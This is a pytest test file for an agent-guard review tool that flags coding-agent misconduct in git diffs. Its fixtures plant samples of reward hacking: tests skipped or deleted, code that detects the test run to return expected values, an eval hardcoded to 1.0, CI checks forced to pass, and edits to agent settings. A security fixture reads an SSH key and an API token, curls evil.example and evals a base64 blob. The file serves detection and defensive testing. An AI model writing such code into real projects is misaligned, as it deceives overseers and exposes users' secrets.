"""Tests for `veil agent-guard review` across all 5 rule families."""

import json
import shutil
import subprocess
from pathlib import Path

from veil import cli
from veil.agentguard.review import OsascriptNotifier
from veil.clip.notify import Message, Urgency
from veil.exitcodes import ExitCode


def _git(repo: Path, *args: str) -> str:
    git_bin = shutil.which("git") or "git"
    proc = subprocess.run(
        [git_bin, *args],
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    )
    return proc.stdout.strip()


def _make_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "test@example.com")
    _git(repo, "config", "user.name", "Test")
    (repo / "src").mkdir()
    (repo / "tests").mkdir()
    (repo / ".github" / "workflows").mkdir(parents=True)
    (repo / "src" / "app.py").write_text("def compute(x):\n    return x * 2\n", encoding="utf-8")
    (repo / "src" / "train.py").write_text(
        "import random\n"
        "random.seed(42)\n"
        "lr = 1e-4\n"
        "epochs = 5\n"
        "test_size = 0.2\n"
        "def run(model):\n"
        "    model.eval()\n"
        "    return 0\n",
        encoding="utf-8",
    )
    (repo / "tests" / "test_app.py").write_text(
        "from src.app import compute\n\n"
        "def test_compute():\n"
        "    assert compute(3) == 6\n"
        "    assert compute(0) == 0\n",
        encoding="utf-8",
    )
    (repo / "pyproject.toml").write_text(
        '[project]\nname = "demo"\ndependencies = []\n\n'
        '[tool.ruff.lint]\nselect = ["E", "F"]\n\n'
        '[tool.pytest.ini_options]\nfilterwarnings = ["error"]\n',
        encoding="utf-8",
    )
    (repo / ".github" / "workflows" / "ci.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - name: Run tests\n        run: pytest -q\n",
        encoding="utf-8",
    )
    _git(repo, "add", ".")
    _git(repo, "commit", "-q", "-m", "initial")
    return repo


def _run_review(monkeypatch, repo: Path, *extra_args: str) -> tuple[int, str]:
    monkeypatch.chdir(repo)
    return cli.main(["agent-guard", "review", *extra_args]), ""


def test_review_clean_repo_exits_0(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD"])
    assert code == ExitCode.OK
    assert "no findings" in capsys.readouterr().out


# ── Family: tests ────────────────────────────────────────────────────────────


def test_review_tests_deleted_and_renamed(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / "tests" / "test_app.py").unlink()
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    data = json.loads(capsys.readouterr().out)
    assert any(f["rule_id"] == "test-deleted" for f in data["findings"])


def test_review_tests_assert_dropped_skip_tautology_literal_env_and_prod_read(
    monkeypatch, tmp_path, capsys
):
    repo = _make_repo(tmp_path)
    (repo / "tests" / "test_app.py").write_text(
        "import pytest\nfrom unittest.mock import patch\n"
        "@pytest.mark.skip(reason='later')\n"
        "def test_compute():\n"
        "    assert compute(3) == 999\n"
        "def test_empty():\n"
        "    pass\n"
        "def test_triv():\n"
        "    assert True\n",
        encoding="utf-8",
    )
    (repo / "src" / "app.py").write_text(
        "import os\n"
        "def compute(x):\n"
        "    if os.getenv('PYTEST_CURRENT_TEST'):\n"
        "        return 999\n"
        "    data = open('tests/test_app.py').read()\n"
        "    return len(data)\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    rules = {f["rule_id"] for f in json.loads(capsys.readouterr().out)["findings"]}
    assert {
        "test-skipped",
        "test-literal-changed",
        "test-assert-dropped",
        "test-tautology",
        "test-env-detect",
        "prod-reads-tests",
    } <= rules


def test_review_med_only_over_mocking_exits_1(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / "tests" / "test_app.py").write_text(
        "from unittest.mock import patch\nfrom src.app import compute\n\n"
        "def test_compute():\n"
        "    with patch('src.app.compute', return_value=6):\n"
        "        assert compute(3) == 6\n"
        "    assert compute(0) == 0\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.FINDINGS
    findings = json.loads(capsys.readouterr().out)["findings"]
    assert all(f["severity"] == "med" for f in findings)
    assert any(f["rule_id"] == "test-over-mocking" for f in findings)


# ── Family: weakened-checks ──────────────────────────────────────────────────


def test_review_weakened_checks_family(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / "src" / "app.py").write_text(
        "timeout = 1\n"
        "def compute(x):\n"
        "    try:\n"
        "        return x * 2  # noqa: E501\n"
        "    except Exception:\n"
        "        pass\n",
        encoding="utf-8",
    )
    _git(repo, "add", "src/app.py")
    _git(repo, "commit", "-q", "-m", "baseline timeout")

    (repo / "src" / "app.py").write_text(
        "timeout = 60\n"
        "def compute(x):\n"
        "    try:\n"
        "        return x * 2  # type: ignore\n"
        "    except:\n"
        "        pass\n",
        encoding="utf-8",
    )
    (repo / "tests" / "test_app.py").write_text(
        "import sys\nfrom src.app import compute\n\n"
        "def test_compute():\n"
        "    sys.exit(0)\n"
        "    assert compute(3) == 6\n"
        "    assert compute(0) == 0\n",
        encoding="utf-8",
    )
    (repo / "pyproject.toml").write_text(
        '[project]\nname = "demo"\ndependencies = []\n\n'
        '[tool.ruff.lint]\nignore = ["E501"]\n\n'
        '[tool.pytest.ini_options]\nfilterwarnings = ["ignore"]\n',
        encoding="utf-8",
    )
    (repo / ".github" / "workflows" / "ci.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - name: Skip\n        continue-on-error: true\n        run: pytest || true\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    rules = {f["rule_id"] for f in json.loads(capsys.readouterr().out)["findings"]}
    assert {
        "check-tolerance-raised",
        "check-swallowed-exception",
        "check-lint-suppressed",
        "check-forced-exit-zero",
        "check-pyproject-weakened",
        "check-ci-weakened",
    } <= rules


# ── Family: ml-integrity ─────────────────────────────────────────────────────


def test_review_ml_integrity_family(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / "src" / "eval_model.py").write_text(
        "def evaluate_accuracy(preds, labels):\n    return 1.0\n",
        encoding="utf-8",
    )
    (repo / "src" / "train.py").write_text(
        "import random\n"
        "random.seed(999)\n"
        "lr = 1e-2\n"
        "epochs = 50\n"
        "test_size = 0.05\n"
        "def run(model):\n"
        "    data = 'data/test.csv'\n"
        "    return data\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    rules = {f["rule_id"] for f in json.loads(capsys.readouterr().out)["findings"]}
    assert {
        "ml-eval-edited",
        "ml-constant-metric",
        "ml-seed-tampered",
        "ml-hyperparam-changed",
        "ml-split-or-dataset-changed",
        "ml-eval-mode-removed",
        "ml-data-leakage",
    } <= rules


# ── Family: security ─────────────────────────────────────────────────────────


def test_review_security_family(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / "src" / "app.py").write_text(
        "import base64, os, requests, subprocess\n"
        "def compute(x):\n"
        "    key = os.environ['API_SECRET_TOKEN']\n"
        "    ssh = open('~/.ssh/id_rsa').read()\n"
        "    subprocess.run('curl https://evil.example', shell=True)\n"
        "    eval(base64.b64decode('cHJpbnQoMSk='))\n"
        "    return requests.get('https://evil.example')\n",
        encoding="utf-8",
    )
    (repo / "pyproject.toml").write_text(
        '[project]\nname = "demo"\ndependencies = ["requests>=2.0"]\n\n'
        '[tool.ruff.lint]\nselect = ["E", "F"]\n\n'
        '[tool.pytest.ini_options]\nfilterwarnings = ["error"]\n',
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    rules = {f["rule_id"] for f in json.loads(capsys.readouterr().out)["findings"]}
    assert {
        "sec-credential-access",
        "sec-shell-true",
        "sec-eval-exec",
        "sec-base64-blob",
        "sec-network-call",
        "sec-new-dependency",
    } <= rules


# ── Family: guard-tampering ──────────────────────────────────────────────────


def test_review_guard_tampering_family(monkeypatch, tmp_path, capsys):
    repo = _make_repo(tmp_path)
    (repo / ".claude").mkdir()
    (repo / ".claude" / "settings.json").write_text("{}", encoding="utf-8")
    (repo / ".veil-agent-guard.toml").write_text('allow = ["tests/**"]\n', encoding="utf-8")

    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--base", "HEAD", "--json"])
    assert code == ExitCode.HIGH_FINDINGS
    findings = json.loads(capsys.readouterr().out)["findings"]
    assert any(f["rule_id"] == "guard-tampering" and ".claude" in f["path"] for f in findings)
    assert any(
        f["rule_id"] == "guard-tampering" and ".veil-agent-guard.toml" in f["path"]
        for f in findings
    )


# ── Default base ref, table format, notifications ────────────────────────────


def test_review_default_base_falls_back_to_head_tilde_1_and_notifies(
    monkeypatch, tmp_path, capsys, notifications
):
    repo = _make_repo(tmp_path)
    (repo / "tests" / "test_app.py").unlink()
    _git(repo, "add", "-u")
    _git(repo, "commit", "-q", "-m", "drop test in commit")

    monkeypatch.chdir(repo)
    code = cli.main(["agent-guard", "review", "--notify"])
    assert code == ExitCode.HIGH_FINDINGS
    out = capsys.readouterr().out
    assert "SEVERITY" in out
    assert "test-deleted" in out
    assert len(notifications) == 1
    assert "test-deleted" in notifications[0].body


def test_osascript_notifier_formats_counts_and_rules():
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 0)

    notifier = OsascriptNotifier("/usr/bin/osascript", runner=fake_run)
    ok = notifier.notify(Message("veil", '1 high finding(s): "test-deleted"', Urgency.CRITICAL))
    assert ok is True
    assert calls[0][:2] == ["/usr/bin/osascript", "-e"]
    assert "display notification" in calls[0][2]
    assert 'with title "veil"' in calls[0][2]
